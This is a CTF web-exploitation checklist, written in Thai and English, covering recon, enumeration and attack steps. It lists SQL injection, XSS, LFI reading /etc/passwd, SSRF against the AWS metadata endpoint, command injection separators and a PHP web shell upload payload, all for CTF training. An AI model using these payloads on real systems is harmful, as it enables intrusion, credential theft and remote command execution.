# Web CTF Quick Checklist

Quick-reference attack checklist สำหรับ web CTF challenges

**ใช้ประกอบกับ:** `department/offensive-security/workflows/web-exploitation.md`

---

## Phase 1: Recon (ทำก่อนเสมอ)

```
□ whatweb <URL>                    → tech stack, server
□ curl -I <URL>                    → HTTP headers
□ ดู source code (Ctrl+U)         → hidden fields, comments, paths
□ robots.txt, sitemap.xml         → hidden paths
□ Cookies                          → ดู session format, JWT?
```

---

## Phase 2: Enumeration

```
□ gobuster dir -x php,html,txt    → hidden pages
□ ffuf parameter fuzzing           → hidden GET/POST params
□ /admin, /dashboard, /api/       → admin panels
□ /.git/, /.env, /backup/         → sensitive files
□ /api/v1/, /graphql              → API endpoints
```

---

## Phase 3: Attack Checklist

### Authentication
```
□ admin:admin, admin:password, admin:123456
□ ' OR 1=1--  (SQL bypass)
□ admin'--
□ JWT? → jwt.io decode → alg:none? weak secret?
□ Password reset flow? → host header injection? token predictable?
```

### SQL Injection
```
□ '  → SQL error?
□ ' OR 1=1--  → different response?
□ ORDER BY N--  → หา column count
□ UNION SELECT NULL,...--
→ ถ้าน่าจะมี: sqlmap -u "URL?param=1" --dbs --batch
```

### XSS
```
□ <script>alert(1)</script>
□ <img src=x onerror=alert(1)>
□ "><script>alert(1)</script>
□ สนใจ Stored XSS มากกว่า Reflected (impact สูงกว่า)
```

### LFI / Path Traversal
```
□ ?page=../etc/passwd
□ ?file=../../../../etc/passwd
□ ?page=php://filter/convert.base64-encode/resource=index
□ Windows: ?page=..\..\..\windows\win.ini
```

### IDOR
```
□ เปลี่ยน id=1 → id=2, id=0, id=-1
□ เปลี่ยน MD5 hash ของ integer (ดู: knowledge/ctf/md5-idor.md)
□ เช็ค API: GET /api/users/2 (ถ้าปกติเป็น /api/users/1)
□ ลอง GUID/UUID → เดาไม่ได้ แต่บางครั้ง enumerate ได้
```

### SSRF
```
□ parameter ที่รับ URL → ลอง http://localhost/
□ http://127.0.0.1/
□ http://169.254.169.254/latest/meta-data/ (AWS)
□ File upload → ลอง URL-based upload
```

### Command Injection
```
□ ; id, | id, && id, `id`, $(id)
□ test input fields ที่ส่งไป execute บน server
□ Ping, traceroute, lookup functions → บ่อยมาก
```

### File Upload
```
□ .php, .php5, .phtml, .phar
□ Content-Type bypass → เปลี่ยนเป็น image/jpeg แต่ upload .php
□ Magic bytes → GIF89a; <?php system($_GET['cmd']); ?>
□ หา upload directory ด้วย gobuster
```

---

## Common CTF Web Flags Locations

```
/flag.txt, /flag, /flag.php
Database table: flags, secret
Environment variable: FLAG, SECRET
/proc/self/environ
/etc/flag
Source code comments
```

---

## Dead End → ลองต่อ

```
หา tech stack → searchsploit <CMS> <version>
ดู error messages → version info, path disclosure
View source → ทุกครั้ง
Response headers → ดู X-Powered-By, Server
JavaScript files → ค้นหา API endpoints, hardcoded creds
```
